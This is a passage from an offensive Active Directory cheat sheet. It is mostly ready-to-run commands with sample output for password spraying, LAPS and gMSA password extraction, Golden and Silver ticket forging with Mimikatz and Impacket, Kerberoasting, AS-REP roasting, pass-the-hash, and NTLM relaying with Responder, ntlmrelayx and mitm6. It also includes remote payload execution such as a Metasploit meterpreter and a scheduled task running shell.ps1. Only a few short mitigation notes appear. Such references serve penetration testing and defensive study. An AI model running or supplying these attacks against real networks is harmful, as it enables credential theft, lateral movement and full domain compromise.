pathtohashes pathtodico -r myrules.rule --opencl-device-types 1,2 # Generate a custom mask based on a wordlist $ git clone https://github.com/iphelix/pack/blob/master/README $ python2 statsgen.py ../hashcat.potfile -o hashcat.mask $ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.hcmask :warning: If the password is not a confidential data (challenges/ctf), you can use online \"cracker\" like : - hashmob.net - crackstation.net - hashes.com User Hunting Sometimes you need to find a machine where a specific user is logged in. You can remotely query every machines on the network to get a list of the users's sessions. CrackMapExec ps1 cme smb 10.10.10.0/24 -u Administrator -p 'P@ssw0rd' --sessions SMB 10.10.10.10 445 WIN-8OJFTLMU1IG [+] Enumerated sessions SMB 10.10.10.10 445 WIN-8OJFTLMU1IG \\\\10.10.10.10 User:Administrator Impacket Smbclient ps1 $ impacket-smbclient Administrator@10.10.10.10 # who host: \\\\10.10.10.10, user: Administrator, active: 1, idle: 0 PowerView Invoke-UserHunter ps1 # Find computers were a Domain Admin OR a specified user has a session Invoke-UserHunter Invoke-UserHunter -GroupName \"RDPUsers\" Invoke-UserHunter -Stealth Password spraying Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates. Most of the time the best passwords to spray are : P@ssw0rd01 , Password123 , Password1 , Hello123 , mimikatz Welcome1 / Welcome01 $Companyname1 : $Microsoft1 SeasonYear : Winter2019* , Spring2020! , Summer2018? , Summer2020 , July2020! Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#) Empty Password (Hash:31d6cfe0d16ae931b73c59d7e0c089c0) Kerberos pre-auth bruteforcing Using kerbrute , a tool to perform Kerberos pre-auth bruteforcing. Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625) , but rather with specific logs to Kerberos pre-authentication failure (4771) . Username bruteforce powershell root@kali:~$ ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt Password bruteforce powershell root@kali:~$ ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username Password spray powershell root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123 root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log Spray a pre-generated passwords list Using crackmapexec and mp64 to generate passwords and spray them against SMB services on the network. powershell crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)` Using DomainPasswordSpray to spray a password against all users of a domain. powershell # https://github.com/dafthack/DomainPasswordSpray Invoke-DomainPasswordSpray -Password Summer2021! # /!\\ be careful with the account lockout ! Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt Using SMBAutoBrute . powershell Invoke-SMBAutoBrute -UserList \"C:\\ProgramData\\admins.txt\" -PasswordList \"Password1, Welcome1, 1qazXDR%+\" -LockoutThreshold 5 -ShowVerbose Spray passwords against the RDP service Using RDPassSpray to target RDP services. powershell git clone https://github.com/xFreed0m/RDPassSpray python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP] Using hydra and ncrack to target RDP services. powershell hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10 ncrack \u2013connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10 BadPwdCount attribute The number of times the user tried to log on to the account using an incorrect password. A value of 0 indicates that the value is unknown. $ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --users LDAP 10.0.2.11 389 dc01 Guest badpwdcount: 0 pwdLastSet: <never> LDAP 10.0.2.11 389 dc01 krbtgt badpwdcount: 0 pwdLastSet: <never> Password in AD User comment $ crackmapexec ldap domain.lab -u 'username' -p 'password' -M user-desc $ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 -M get-desc-users GET-DESC... 10.0.2.11 389 dc01 [+] Found following users: GET-DESC... 10.0.2.11 389 dc01 User: Guest description: Built-in account for guest access to the computer/domain GET-DESC... 10.0.2.11 389 dc01 User: krbtgt description: Key Distribution Center Service Account There are 3-4 fields that seem to be common in most AD schemas: UserPassword , UnixUserPassword , unicodePwd and msSFU30Password . enum4linux | grep -i desc Get-WmiObject -Class Win32_UserAccount -Filter \"Domain='COMPANYDOMAIN' AND Disabled='False'\" | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired,PasswordChangeable, Description, SID or dump the Active Directory and grep the content. ldapdomaindump -u 'DOMAIN\\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/ Password of Pre-Created Computer Account When Assign this computer account as a pre-Windows 2000 computer checkmark is checked, the password for the computer account becomes the same as the computer account in lowercase. For instance, the computer account SERVERDEMO$ would have the password serverdemo . # Create a machine with default password # must be run from a domain joined device connected to the domain djoin /PROVISION /DOMAIN <fqdn> /MACHINE evilpc /SAVEFILE C:\\temp\\evilpc.txt /DEFPWD /PRINTBLOB /NETBIOS evilpc When you attempt to login using the credential you should have the following error code : STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT . Then you need to change the password with rpcchangepwd.py Reading LAPS Password Use LAPS to automatically manage local administrator passwords on domain joined computers so that passwords are unique on each managed computer, randomly generated, and securely stored in Active Directory infrastructure. Determine if LAPS is installed Get-ChildItem 'c:\\program files\\LAPS\\CSE\\Admpwd.dll' Get-FileHash 'c:\\program files\\LAPS\\CSE\\Admpwd.dll' Get-AuthenticodeSignature 'c:\\program files\\LAPS\\CSE\\Admpwd.dll' Extract LAPS password The \"ms-mcs-AdmPwd\" a \"confidential\" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users From Windows: adsisearcher (native binary on Windows 8+) powershell ([adsisearcher]\"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))\").findAll() | ForEach-Object { $_.properties} ([adsisearcher]\"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))\").findAll() | ForEach-Object { $_.properties} PowerView powershell PS > Import-Module .\\PowerView.ps1 PS > Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime LAPSToolkit ```powershell $ Get-LAPSComputers ComputerName Password Expiration ------------ -------- ---------- example.domain.local dbZu7;vGaI)Y6w1L 02/21/2021 22:29:18 $ Find-LAPSDelegatedGroups $ Find-AdmPwdExtendedRights ``` Powershell AdmPwd.PS powershell foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}} From Linux: pyLAPS to read and write LAPS passwords: bash # Read the password of all computers ./pyLAPS.py --action get -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1 # Write a random password to a specific computer ./pyLAPS.py --action set --computer 'PC01$' -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1 CrackMapExec : bash crackmapexec smb 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps LAPSDumper bash python laps.py -u 'user' -p 'password' -d 'domain.local' python laps.py -u 'user' -p 'e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c' -d 'domain.local' -l 'dc01.domain.local' ldapsearch bash ldapsearch -x -h -D \"@\" -w -b \"dc=<>,dc=<>,dc=<>\" \"(&(objectCategory=computer)(ms-MCS-AdmPwd=*))\" ms-MCS-AdmPwd` Grant LAPS Access The members of the group \"Account Operator\" can add and modify all the non admin users and groups. Since LAPS ADM and LAPS READ are considered as non admin groups, it's possible to add an user to them, and read the LAPS admin password Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred -Domain \"domain.local\" Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -Domain \"domain.local\" Reading GMSA Password User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically rotated every 30 days to a randomly generated password of 256 bytes. GMSA Attributes in the Active Directory msDS-GroupMSAMembership ( PrincipalsAllowedToRetrieveManagedPassword ) - stores the security principals that can access the GMSA password. msds-ManagedPassword - This attribute contains a BLOB with password information for group-managed service accounts. msDS-ManagedPasswordId - This constructed attribute contains the key identifier for the current managed password data for a group MSA. msDS-ManagedPasswordInterval - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA. Extract NT hash from the Active Directory GMSAPasswordReader (C#) ps1 # https://github.com/rvazarkar/GMSAPasswordReader GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT gMSADumper (Python) powershell # https://github.com/micahvandeusen/gMSADumper python3 gMSADumper.py -u User -p Password1 -d domain.local Active Directory Powershell ps1 $gmsa = Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword' $blob = $gmsa.'msDS-ManagedPassword' $mp = ConvertFrom-ADManagedPasswordBlob $blob $hash1 = ConvertTo-NTHash -Password $mp.SecureCurrentPassword gMSA_Permissions_Collection.ps1 based on Active Directory PowerShell module Forging Golden GMSA One notable difference between a Golden Ticket attack and the Golden GMSA attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is compromised, there is no way to protect the gMSAs associated with it. Using GoldenGMSA ```ps1 # Enumerate all gMSAs GoldenGMSA.exe gmsainfo # Query for a specific gMSA GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112 Dump all KDS Root Keys GoldenGMSA.exe kdsinfo Dump a specific KDS Root Key GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb Compute gMSA password --sid : SID of the gMSA (required) --kdskey : Base64 encoded KDS Root Key --pwdid : Base64 of msds-ManagedPasswordID attribute value GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # requires privileged access to the domain GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB[...]G2/M= # requires LDAP access GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45U[...]SM0R7djG2/M= --pwdid AQAAA[..]AAA # Offline mode ``` Pass-the-Ticket Golden Tickets Forging a TGT require the krbtgt NTLM hash The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt ntlm hash must be used. Using Mimikatz # Get info - Mimikatz lsadump::lsa /inject /name:krbtgt lsadump::lsa /patch lsadump::trust /patch lsadump::dcsync /user:krbtgt # Forge a Golden ticket - Mimikatz kerberos::purge kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt kerberos::tgt Using Meterpreter # Get info - Meterpreter(kiwi) dcsync_ntlm krbtgt dcsync krbtgt # Forge a Golden ticket - Meterpreter load kiwi golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck> golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck kerberos_ticket_purge kerberos_ticket_use /root/Downloads/pentestlabuser.tck kerberos_ticket_list Using a ticket on Linux # Convert the ticket kirbi to ccache with kekeo misc::convert ccache ticket.kirbi # Alternatively you can use ticketer from Impacket ./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519 ./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519 export KRB5CCNAME=/home/user/ticket.ccache cat $KRB5CCNAME # NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 If you need to swap ticket between Windows and Linux, you need to convert them with ticket_converter or kekeo . root@kali:ticket_converter$ python ticket_converter.py velociraptor.ccache velociraptor.kirbi Converting ccache => kirbi root@kali:ticket_converter$ python ticket_converter.py velociraptor.kirbi velociraptor.ccache Converting kirbi => ccache Mitigations: * Hard to detect because they are legit TGT tickets * Mimikatz generate a golden ticket with a life-span of 10 years Pass-the-Ticket Silver Tickets Forging a TGS require machine account password (key) or NTLM hash of the service account. # Create a ticket for the service mimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE # Examples mimikatz $ /kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt mimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park # Then use the same steps as a Golden ticket mimikatz $ misc::convert ccache ticket.kirbi root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 Interesting services to target with a silver ticket : Service Type Service Silver Tickets Attack WMI HOST + RPCSS wmic.exe /authority:\"kerberos:DOMAIN\\DC01\" /node:\"DC01\" process call create \"cmd /c evil.exe\" PowerShell Remoting CIFS + HTTP + (wsman?) New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC WinRM HTTP + wsman New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC Scheduled Tasks HOST schtasks /create /s dc01 /SC WEEKLY /RU \"NT Authority\\System\" /IN \"SCOM Agent Health Check\" /IR \"C:/shell.ps1\" Windows File Share (CIFS) CIFS dir \\\\dc01\\c$ LDAP operations including Mimikatz DCSync LDAP lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt Windows Remote Server Administration Tools RPCSS + LDAP + CIFS / Mitigations: * Set the attribute \"Account is Sensitive and Cannot be Delegated\" to prevent lateral movement with the generated ticket. Kerberoasting \"A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. \" - MSDN Any valid domain user can request a kerberos ticket (TGS) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as. GetUserSPNs from Impacket Suite ```powershell $ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies ServicePrincipalName Name MemberOf PasswordLastSet LastLogon active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 21:06:40 2018-12-03 17:11:11 $krb5tgs$23$ Administrator$ACTIVE.HTB$active/CIFS~445 $424338c0a3c3af43[...]84fd2 ``` CrackMapExec Module powershell $ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt LDAP 10.0.2.11 389 dc01 [*] Windows 10.0 Build 17763 x64 (name:dc01) (domain:lab.local) (signing:True) (SMBv1:False) LDAP 10.0.2.11 389 dc01 $krb5tgs$23$*john.doe$lab.local$MSSQLSvc/dc01.lab.local~1433*$efea32[...]49a5e82$b28fc61[...]f800f6dcd259ea1fca8f9 Rubeus ```powershell # Stats Rubeus.exe kerberoast /stats ------------------------------------- ---------------------------------- | Supported Encryption Type | Count | | Password Last Set Year | Count | | RC4_HMAC_DEFAULT | 1 | | 2021 | 1 | # Kerberoast (RC4 ticket) Rubeus.exe kerberoast /creduser:DOMAIN\\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt # Kerberoast (AES ticket) # Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested. Rubeus.exe kerberoast /tgtdeleg # Kerberoast (RC4 ticket) # The tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted. Rubeus.exe kerberoast /rc4opsec ``` PowerView powershell Request-SPNTicket -SPN \"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local\" bifrost on macOS machine powershell ./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.lab.local -kerberoast true targetedKerberoast powershell # for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), # print the \"kerberoast\" hash, and delete the temporary SPN set for that operation targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key] Then crack the ticket using the correct hashcat mode ( $krb5tgs$23 = etype 23 ) Mode Description 13100 Kerberos 5 TGS-REP etype 23 (RC4) 19600 Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) 19700 Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) ./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt ./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt Mitigations: * Have a very long password for your accounts with SPNs (> 32 characters) * Make sure no users have SPNs KRB_AS_REP Roasting If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting Requirements : - Accounts with the attribute DONT_REQ_PREAUTH ( PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose ) Rubeus ```powershell C:\\Rubeus>Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast [ ] Action: AS-REP roasting [ ] Target User : TestOU3user [ ] Target Domain : testlab.local [ ] SamAccountName : TestOU3user [ ] DistinguishedName : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local [ ] Using domain controller: testlab.local (192.168.52.100) [ ] Building AS-REQ (w/o preauth) for: 'testlab.local\\TestOU3user' [ ] Connecting to 192.168.52.100:88 [ ] Sent 169 bytes [ ] Received 1437 bytes [+] AS-REQ w/o preauth successful! [*] AS-REP hash: $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)... ``` GetNPUsers from Impacket Suite ```powershell $ python GetNPUsers.py htb.local/svc-alfresco -no-pass [*] Getting TGT for svc-alfresco $krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4 # extract hashes root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast ``` CrackMapExec Module powershell $ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt LDAP 10.0.2.11 389 dc01 $krb5asrep$23$john.doe@LAB.LOCAL:5d1f750[...]2a6270d7$096fc87726c64e545acd4687faf780[...]13ea567d5 Using hashcat or john to crack the ticket. # crack AS_REP messages with hashcat root@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt root@windows:hashcat$ hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\\wordlists\\rockyou.txt # crack AS_REP messages with john C:\\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast Mitigations : * All accounts must have \"Kerberos Pre-Authentication\" enabled (Enabled by Default). Pass-the-Hash The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren\u2019t the built-in RID 500. Metasploit powershell use exploit/windows/smb/psexec set RHOST 10.2.0.3 set SMBUser jarrieta set SMBPass nastyCutt3r # NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack. # NOTE2: Require the full NTLM hash, you may need to add the \"blank\" LM (aad3b435b51404eeaad3b435b51404ee) set PAYLOAD windows/meterpreter/bind_tcp run shell CrackMapExec powershell cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x \"whoami\" Impacket suite powershell proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d Windows RDP and mimikatz powershell sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863 sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the users ntlm hash> /run:\"mstsc.exe /restrictedadmin\" You can extract the local SAM database to find the local administrator hash : C:\\> reg.exe save hklm\\sam c:\\temp\\sam.save C:\\> reg.exe save hklm\\security c:\\temp\\security.save C:\\> reg.exe save hklm\\system c:\\temp\\system.save $ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL OverPass-the-Hash (pass the key) In this technique, instead of passing the hash directly, we use the NTLM hash of an account to request a valid Kerberost ticket (TGT). Using impacket root@kali:~$ python ./getTGT.py -hashes \":1a59bd44fe5bec39c44c8cd3524dee\" lab.ropnop.com root@kali:~$ export KRB5CCNAME=\"/root/impacket-examples/velociraptor.ccache\" root@kali:~$ python3 psexec.py \"jurassic.park/velociraptor@labwws02.jurassic.park\" -k -no-pass # also with the AES Key if you have it root@kali:~$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com root@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5 root@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM root@kali:~$ klist Using Rubeus # Request a TGT as the target user and pass it into the current session # NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs .\\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt # More stealthy variant, but requires the AES256 hash .\\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt # Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation) .\\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\\Windows\\System32\\cmd.exe Capturing and cracking Net-NTLMv1/NTLMv1 hashes Net-NTLM (NTLMv1) hashes are used for network authentication (they are derived from a challenge/response algorithm and are based on the user's NT hash. :information_source: : Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to NetNTLMv1 Challenge/Response authentication . This uses the outdated encryption method DES to protect the NT/LM Hashes. Requirements : * LmCompatibilityLevel = 0x1: Send LM & NTLM ( reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v lmcompatibilitylevel ) Exploitation : * Capturing using Responder: Edit the /etc/responder/Responder.conf file to include the magical 1122334455667788 challenge ps1 HTTPS = On DNS = On LDAP = On ... ; Custom challenge. ; Use \"Random\" for generating a random challenge for each requests (Default) Challenge = 1122334455667788 * Fire Responder: responder -I eth0 --lm , if --disable-ess is set, extended session security will be disabled for NTLMv1 authentication * Force a callback: ps1 PetitPotam.exe Responder-IP DC-IP # Patched around August 2021 PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users * If you got some NTLMv1 hashes , you need to format them to submit them on crack.sh ps1 username::hostname:response:response:challenge -> NTHASH:response NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972 * Or crack them with Hashcat / John The Ripper ps1 john --format=netntlm hash.txt hashcat -m 5500 -a 3 hash.txt * Now you can DCSync using the Pass-The-Hash with the DC machine account :warning: NTLMv1 with SSP(Security Support Provider) changes the server challenge and is not quite ideal for the attack, but it can be used. Mitigations : Set the Lan Manager authentication level to Send NTLMv2 responses only. Refuse LM & NTLM Capturing and cracking Net-NTLMv2/NTLMv2 hashes If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison LLMNR , MDNS and NETBIOS requests on the network. # https://github.com/lgandx/Responder $ sudo ./Responder.py -I eth0 -wfrd -P -v # https://github.com/Kevin-Robertson/InveighZero PS > .\\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N] # https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1 PS > Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y \u2013mDNS Y \u2013Proxy Y -MachineAccounts Y Crack the hashes with Hashcat / John The Ripper john --format=netntlmv2 hash.txt hashcat -m 5600 -a 3 hash.txt Man-in-the-Middle attacks & relaying NTLMv1 and NTLMv2 can be relayed to connect to another machine. Hash Hashcat Attack method LM 3000 crack/pass the hash NTLM/NTHash 1000 crack/pass the hash NTLMv1/Net-NTLMv1 5500 crack/relay attack NTLMv2/Net-NTLMv2 5600 crack/relay attack Crack the hash with hashcat . hashcat -m 5600 -a 0 hash.txt crackstation.txt MS08-068 NTLM reflection NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to Windows Server 2008. This vulnerability allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim machine using the victim\u2019s own credentials. https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068 msf > use exploit/windows/smb/smb_relay msf exploit(smb_relay) > show targets SMB Signing Disabled and IPv4 If a machine has SMB signing : disabled , it is possible to use Responder with Multirelay.py script to perform an NTLMv2 hashes relay and get a shell access on the machine. Also called LLMNR/NBNS Poisoning Open the Responder.conf file and set the value of SMB and HTTP to Off . powershell [Responder Core] ; Servers to start ... SMB = Off # Turn this off HTTP = Off # Turn this off Run python RunFinger.py -i IP_Range to detect machine with SMB signing : disabled . Run python Responder.py -I <interface_card> Use a relay tool such as ntlmrelayx or MultiRelay impacket-ntlmrelayx -tf targets.txt to dump the SAM database of the targets in the list. python MultiRelay.py -t <target_machine_IP> -u ALL ntlmrelayx can also act as a SOCK proxy with every compromised sessions. ```powershell $ impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support [*] Servers started, waiting for connections Type help for list of commands ntlmrelayx> socks Protocol Target Username Port -------- -------------- ------------------------ ---- MSSQL 192.168.48.230 VULNERABLE/ADMINISTRATOR 1433 SMB 192.168.48.230 CONTOSO/NORMALUSER1 445 MSSQL 192.168.48.230 CONTOSO/NORMALUSER1 1433 You might need to select a target with \"-t\" impacket-ntlmrelayx -t mssql://10.10.10.10 -socks -smb2support impacket-ntlmrelayx -t smb://10.10.10.10 -socks -smb2support the socks proxy can then be used with your Impacket tools or CrackMapExec $ proxychains impacket-smbclient //192.168.48.230/Users -U contoso/normaluser1 $ proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth $ proxychains crackmapexec mssql 10.10.10.10 -u user -p '' -d DOMAIN -q \"SELECT 1\" ``` Mitigations : Disable LLMNR via group policy powershell Open gpedit.msc and navigate to Computer Configuration > Administrative Templates > Network > DNS Client > Turn off multicast name resolution and set to Enabled Disable NBT-NS powershell This can be achieved by navigating through the GUI to Network card > Properties > IPv4 > Advanced > WINS and then under \"NetBIOS setting\" select Disable NetBIOS over TCP/IP SMB Signing Disabled and IPv6 Since MS16-077 the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS. crackmapexec smb $hosts --gen-relay-list relay.txt # DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6 # -d is the domain name that we filter our request on - the attacked domain # -i is the interface we have mitm6 listen on for events mitm6 -i eth0 -d $domain # spoofing WPAD and relaying NTLM credentials impacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt impacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug # -ip is the interface you want the relay to run on # -wh is for WPAD host, specifying your wpad file to serve # -t is the target where you want to relay to. impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2 Drop the MIC The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP Check vulnerability with cve-2019-1040-scanner python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET' [*] CVE-2019-1040 scanner by @_dirkjan / Fox-IT - Based on impacket by SecureAuth [*] Target TARGET is not vulnerable to CVE-2019-1040 (authentication was rejected) Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD 